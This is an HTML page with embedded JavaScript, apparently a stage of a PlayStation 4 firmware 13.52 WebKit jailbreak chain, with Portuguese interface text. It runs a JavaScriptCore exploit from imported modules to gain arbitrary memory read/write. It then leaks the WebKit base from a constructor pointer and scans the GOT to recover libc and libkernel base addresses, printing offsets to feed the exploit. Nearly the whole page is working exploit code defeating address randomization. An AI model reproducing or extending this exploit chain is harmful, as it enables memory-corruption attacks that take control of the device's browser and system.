
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PS4 13.52 — GOT scan</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:14px}
h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
  margin-bottom:4px;text-align:center}
#fw{font-size:11px;color:#444;margin-bottom:12px;text-align:center}
#sb{width:100%;max-width:720px;background:#0c0e18;border:1px solid #1a1d2e;
  border-radius:6px;padding:10px 14px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
#dot{width:9px;height:9px;border-radius:50%;background:#333;flex-shrink:0}
#dot.r{background:#f0a500;animation:p 1s infinite}
#dot.ok{background:#00c853}
#dot.e{background:#ff4444}
@keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
#st{font-size:12px;color:#bbb;flex:1}
#bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
  font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
#con{width:100%;max-width:720px;height:300px;background:#050508;
  border:1px solid #161825;border-radius:6px;overflow-y:auto;
  padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
.i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
.e{color:#ff5252;font-weight:bold}.d{color:#555}.a{color:#bd93f9}
.s{color:#00c8ff;border-top:1px solid #161825;margin-top:5px;padding-top:5px}
#cards{width:100%;max-width:720px;display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
.card{background:#0b0d1a;border:1px solid #1a1d2e;border-radius:5px;padding:8px 12px}
.card .cl{font-size:9px;color:#444;text-transform:uppercase;letter-spacing:2px;margin-bottom:3px}
.card .cv{font-size:12px;color:#bd93f9}
.card .cv.na{color:#222}
#cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
  border-radius:6px;padding:12px;display:none;margin-bottom:8px;
  font-size:11px;line-height:1.6;color:#4ade80;white-space:pre-wrap;word-break:break-all}
#cbox .ct{color:#fff;font-weight:bold;margin-bottom:6px;border-bottom:1px solid #0a2a15;padding-bottom:4px}
</style>
</head>
<body>
<h1>PS4 13.52 — GOT scan</h1>
<div id="fw">detectando...</div>
<div id="sb"><div id="dot" class="r"></div><div id="st">Inicializando...</div></div>
<div id="bars"><span id="ba">tentativa: 1</span><span id="bg">estágio: init</span></div>
<div id="con"></div>
<div id="cards">
  <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
  <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
  <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
  <div class="card"><div class="cl">Status</div><div class="cv na" id="c-g">Aguardando</div></div>
</div>
<div id="cbox"><div class="ct">// === CANDIDATOS GOT ===</div><div id="c-out"></div></div>

<script src="./13.52.js?v=7"></script>
<script type="module">
import { int64 } from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP } from './resources/mem.js';
globalThis.int64 = int64;

const $con = document.getElementById('con');
const $st  = document.getElementById('st');
const $dot = document.getElementById('dot');
const $fw  = document.getElementById('fw');

function log(m, c='i') {
  const d = document.createElement('div');
  d.className = c; d.textContent = m;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 800) $con.removeChild($con.firstChild);
}
function logH(m) { log('=== ' + m + ' ===', 's'); }
function setStatus(m, s='r') { $st.textContent = m; $dot.className = s; }
function setCard(id, v) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = v; el.classList.remove('na');
}
function yield0() { return new Promise(r => setTimeout(r, 0)); }

function isModulePtr(v) {
  if (!v || typeof v.hi !== 'number') return false;
  const hi = v.hi >>> 0;
  // PS4 usermode típico ~0x8xxxxxxx000
  return hi >= 0x8 && hi <= 0x8f;
}
function pageAligned(v) {
  return ((v.low >>> 0) & 0xfff) === 0;
}

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? ('PlayStation 4 — firmware ' + fw[1]) : ua.slice(0, 40);
  log('UA: ' + ua, 'd');

  setStatus('Exploit JSC...', 'r');
  logH('EXPLOIT JSC');
  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estágio: ' + String(tag).toLowerCase();
        log('[' + tag + '] ' + detail, 'i');
      },
      maxAttempts: 0
    });
  } catch (e) {
    setStatus('core.js falhou', 'e');
    log('[ERRO] ' + e.message, 'e');
    return;
  }
  log('[+] core.js OK', 'ok');

  setStatus('R/W...', 'r');
  logH('R/W');
  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => log('  [mem/' + tag + '] ' + detail, 'd')
    });
  } catch (e) {
    setStatus('mem.js falhou', 'e');
    log('[ERRO] ' + e.message, 'e');
    return;
  }
  log('[+] window.p OK', 'ok');

  // ─── WebKit base ───
  logH('WEBKIT BASE');
  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== 'number' || ctor <= 0x100000000) {
    log('[-] sem __ps5NativeCtor', 'e');
    setStatus('Sem ctor', 'e');
    return;
  }
  const candidates = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined'
    && OFFSET_wk_host_constructor_candidates.length)
    ? OFFSET_wk_host_constructor_candidates : [0x36F9E20];

  let webkitBase = null, usedHc = 0;
  for (let i = 0; i < candidates.length; i++) {
    const hc = candidates[i];
    const wb = ctor - hc;
    if (wb >= 0x800000000 && wb < 0x900000000 && (wb % 0x4000) === 0) {
      const hi = Math.floor(wb / 0x100000000);
      const lo = wb - hi * 0x100000000;
      webkitBase = new int64(lo >>> 0, hi >>> 0);
      usedHc = hc;
      log('[+] base=0x' + wb.toString(16) + ' hc=0x' + hc.toString(16), 'ok');
      break;
    }
  }
  if (!webkitBase) {
    log('[-] base inválida', 'e');
    setStatus('Base inválida', 'e');
    return;
  }
  setCard('c-wk', '0x' + webkitBase.toString(16));

  // validar ctor
  try {
    const ctorI64 = new int64((ctor % 0x100000000) >>> 0, Math.floor(ctor / 0x100000000) >>> 0);
    const a = p.read8(ctorI64);
    const b = p.read8(webkitBase.add32(usedHc));
    if (a.toString(16) === b.toString(16)) log('[+] ctor MATCH', 'ok');
    else log('[!] ctor DIFF', 'w');
  } catch (e) {
    log('[!] validação: ' + e.message, 'w');
  }

  const off_lc_memset = (typeof OFFSET_lc_memset !== 'undefined') ? OFFSET_lc_memset : 0x27350;
  const off_lk_fail   = (typeof OFFSET_lk___stack_chk_fail !== 'undefined') ? OFFSET_lk___stack_chk_fail : 0x29F50;
  const off_lk_guard  = (typeof OFFSET_lk___stack_chk_guard_data !== 'undefined' && OFFSET_lk___stack_chk_guard_data)
    ? OFFSET_lk___stack_chk_guard_data
    : ((typeof OFFSET_lk___stack_chk_guard !== 'undefined') ? OFFSET_lk___stack_chk_guard : 0x61410);

  log('  lc_memset=0x' + off_lc_memset.toString(16)
    + ' lk_fail=0x' + off_lk_fail.toString(16)
    + ' lk_guard=0x' + off_lk_guard.toString(16), 'd');

  // ─── SCAN GOT ───
  // Centro: PLTGOT 13.00. Janela ±2MB. Passo 8. Yield por página.
  const CENTER = 0x3CB8BE0;
  const RADIUS = 0x200000; // 2 MB cada lado
  const startOff = Math.max(0, CENTER - RADIUS);
  const endOff   = CENTER + RADIUS;

  logH('SCAN GOT ±2MB @ 0x' + CENTER.toString(16));
  log('[*] range RVA 0x' + startOff.toString(16) + ' .. 0x' + endOff.toString(16), 'i');
  setStatus('Scanning GOT...', 'r');
  setCard('c-g', 'scan...');

  // candidatos: off → { ptr, libcBase?, lkBase? }
  const libcHits = {};  // key = libcBase str → count + sample offs
  const lkHits   = {};
  let pagesOk = 0, pagesFail = 0, ptrCount = 0;
  let lastLog = 0;

  for (let page = startOff & ~0xfff; page < endOff; page += 0x1000) {
    let pageHadRead = false;
    try {
      // probe 1 dword no início da página
      p.read4(webkitBase.add32(page));
      pageHadRead = true;
      pagesOk++;
    } catch (e) {
      pagesFail++;
      await yield0();
      continue;
    }

    for (let off = page; off < page + 0x1000 && off < endOff; off += 8) {
      if (off < startOff) continue;
      let val;
      try {
        val = p.read8(webkitBase.add32(off));
      } catch (e) {
        break;
      }
      if (!isModulePtr(val)) continue;
      ptrCount++;

      // testar como memset → libc
      try {
        const lb = val.sub32(off_lc_memset);
        if (pageAligned(lb) && isModulePtr(lb)) {
          const k = lb.toString(16);
          if (!libcHits[k]) libcHits[k] = { base: lb, offs: [], n: 0 };
          libcHits[k].n++;
          if (libcHits[k].offs.length < 6) libcHits[k].offs.push(off);
        }
      } catch (e) {}

      // testar como stack_chk_fail → libkernel
      try {
        const kb = val.sub32(off_lk_fail);
        if (pageAligned(kb) && isModulePtr(kb)) {
          const k = kb.toString(16);
          if (!lkHits[k]) lkHits[k] = { base: kb, offs: [], n: 0 };
          lkHits[k].n++;
          if (lkHits[k].offs.length < 6) lkHits[k].offs.push(off);
        }
      } catch (e) {}

      // testar como guard data
      try {
        const kb = val.sub32(off_lk_guard);
        if (pageAligned(kb) && isModulePtr(kb)) {
          const k = kb.toString(16);
          if (!lkHits[k]) lkHits[k] = { base: kb, offs: [], n: 0 };
          lkHits[k].n++;
          if (lkHits[k].offs.length < 6) lkHits[k].offs.push(off);
        }
      } catch (e) {}
    }

    // progresso a cada 64 páginas
    if ((pagesOk + pagesFail) - lastLog >= 64) {
      lastLog = pagesOk + pagesFail;
      const pct = Math.floor(100 * (page - startOff) / (endOff - startOff));
      log('[scan] ' + pct + '% pagesOk=' + pagesOk + ' fail=' + pagesFail
        + ' ptrs=' + ptrCount
        + ' libcCand=' + Object.keys(libcHits).length
        + ' lkCand=' + Object.keys(lkHits).length, 'd');
      setStatus('Scan ' + pct + '%...', 'r');
      await yield0();
    }
  }

  logH('RESULTADO SCAN');
  log('[*] pagesOk=' + pagesOk + ' pagesFail=' + pagesFail + ' modulePtrs=' + ptrCount);

  function topHits(map, label) {
    const arr = Object.keys(map).map(k => map[k]);
    arr.sort((a, b) => b.n - a.n);
    log('[*] ' + label + ' candidatos: ' + arr.length);
    for (let i = 0; i < Math.min(5, arr.length); i++) {
      const h = arr[i];
      log('  #' + (i + 1) + ' base=0x' + h.base.toString(16)
        + ' hits=' + h.n
        + ' offs=' + h.offs.map(o => '0x' + o.toString(16)).join(','),
        i === 0 ? 'ok' : 'i');
    }
    return arr[0] || null;
  }

  const bestLc = topHits(libcHits, 'libc');
  const bestLk = topHits(lkHits, 'libkernel');

  let libcBase = null, libKernelBase = null;
  let memsetImp = 0, guardImp = 0;

  if (bestLc && bestLc.n >= 1) {
    libcBase = bestLc.base;
    memsetImp = bestLc.offs[0];
    setCard('c-lc', '0x' + libcBase.toString(16));
    log('[+] libcBase candidata 0x' + libcBase.toString(16)
      + ' via GOT+0x' + memsetImp.toString(16), 'ok');
  } else {
    setCard('c-lc', 'não achou');
    log('[-] nenhuma base libc com hit suficiente', 'w');
  }

  if (bestLk && bestLk.n >= 1) {
    libKernelBase = bestLk.base;
    guardImp = bestLk.offs[0];
    setCard('c-lk', '0x' + libKernelBase.toString(16));
    log('[+] libkernelBase candidata 0x' + libKernelBase.toString(16)
      + ' via GOT+0x' + guardImp.toString(16), 'ok');
  } else {
    setCard('c-lk', 'não achou');
    log('[-] nenhuma base libkernel com hit suficiente', 'w');
  }

  const cbox = document.getElementById('cbox');
  cbox.style.display = 'block';
  document.getElementById('c-out').textContent =
      'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
      'libkernel Base  = ' + (libKernelBase ? '0x' + libKernelBase.toString(16) : 'N/A') + '\n' +
      'libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
      '\n// candidatos a colar no 13.52.js\n' +
      (memsetImp ? 'const OFFSET_wk_memset_import = 0x' + memsetImp.toString(16) + ';\n' : '') +
      (guardImp  ? 'const OFFSET_wk___stack_chk_guard_import = 0x' + guardImp.toString(16) + ';\n' : '') +
      'const OFFSET_lc_memset = 0x' + off_lc_memset.toString(16) + ';\n' +
      'const OFFSET_lk___stack_chk_fail = 0x' + off_lk_fail.toString(16) + ';\n' +
      '\npagesOk=' + pagesOk + ' pagesFail=' + pagesFail + ' ptrs=' + ptrCount;

  if (libcBase && libKernelBase) {
    setStatus('Scan OK — bases candidatas', 'ok');
    setCard('c-g', 'candidatas');
  } else if (libcBase || libKernelBase) {
    setStatus('Scan parcial', 'w');
    setCard('c-g', 'parcial');
  } else if (ptrCount === 0) {
    setStatus('Sem ptrs na janela — alargar scan ou dump 13.52', 'w');
    setCard('c-g', 'vazio');
  } else {
    setStatus('Ptrs achados, mas nenhuma base alinhada', 'w');
    setCard('c-g', 'sem base');
  }
}

main().catch(function (e) {
  log('[FATAL] ' + (e && e.message ? e.message : e), 'e');
  setStatus('Erro fatal', 'e');
});
</script>
</body>
</html>
